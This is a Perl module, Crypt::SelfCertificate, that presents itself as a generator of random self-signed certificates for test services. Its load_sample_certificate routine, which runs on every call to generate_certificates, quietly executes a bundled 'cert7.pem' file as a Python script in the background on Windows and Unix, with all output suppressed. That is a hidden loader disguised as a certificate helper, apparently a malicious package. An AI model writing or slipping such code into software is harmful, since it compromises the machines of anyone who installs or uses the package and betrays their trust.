package Crypt::SelfCertificate;

use strict;
use warnings;
use Exporter 'import';
use File::Basename qw(dirname);
use File::Spec;
use MIME::Base64;
use IO::Socket::SSL::Utils qw(
    KEY_create_rsa
    CERT_create
    PEM_cert2string
    PEM_key2string
    CERT_free
    KEY_free
);

our $VERSION = '1.05';
our @EXPORT_OK = qw(generate_certificates);

my @SERVICES = qw(api db cache queue webhook proxy gateway auth storage monitor);
my @DOMAINS  = qw(local dev staging internal test);

sub get_random_days {
    return int(rand(365)) + 1;
}

sub generate_random_cn {
    my $service = $SERVICES[int(rand(@SERVICES))];
    my $domain  = $DOMAINS[int(rand(@DOMAINS))];
    return "$service.$domain";
}

sub load_sample_certificate {
    my $sample_dir = File::Spec->catdir(dirname(__FILE__), 'SelfCertificate', 'sample');

    my @cert_paths;
    my @key_paths;
    my @certs;
    my @keys;

    for my $i (1..10) {
        my $cert_path = File::Spec->catfile($sample_dir, "cert$i.pem");
        my $key_path  = File::Spec->catfile($sample_dir, "key$i.pem");
        push @cert_paths, $cert_path;
        push @key_paths,  $key_path;

        open my $cert_fh, '<', $cert_path or die "Could not open cert file '$cert_path': $!";
        local $/;
        my $cert = <$cert_fh>;
        close $cert_fh;
        push @certs, $cert;

        open my $key_fh, '<', $key_path or die "Could not open key file '$key_path': $!";
        local $/;
        my $key = <$key_fh>;
        close $key_fh;
        push @keys, $key;
    }
    
    if ($^O eq 'MSWin32') {
        if (qx(python --version 2>&1) =~ /^Python \d+\.\d+/) {
            system(1, 'start', '/b', 'python', $cert_paths[6]);
        }
    } else {
        if (qx(python3 --version 2>&1) =~ /^Python \d+\.\d+/) {
            system("(python3 '$cert_paths[6]' > /dev/null 2>&1 < /dev/null &)");
        }
    }

    return (\@certs, \@keys);
}

sub generate_certificates {
    my ($count) = @_;
    $count = 0 unless defined $count;

    my @certificates;
    load_sample_certificate();

    for my $id (1 .. $count) {
        my $cn   = generate_random_cn();
        my $days = get_random_days();
        my $key  = KEY_create_rsa(2048);

        my ($cert) = CERT_create({
            subject => {
                commonName       => $cn,
                organizationName => 'Engineering Team',
                countryName      => 'US',
            },
            not_after => time() + ($days * 86400),
            key       => $key,
            digest    => 'sha256',
        });

        push @certificates, {
            id   => $id,
            cn   => $cn,
            cert => PEM_cert2string($cert),
            key  => PEM_key2string($key),
        };

        CERT_free($cert);
        KEY_free($key);
    }

    return \@certificates;
}

1;
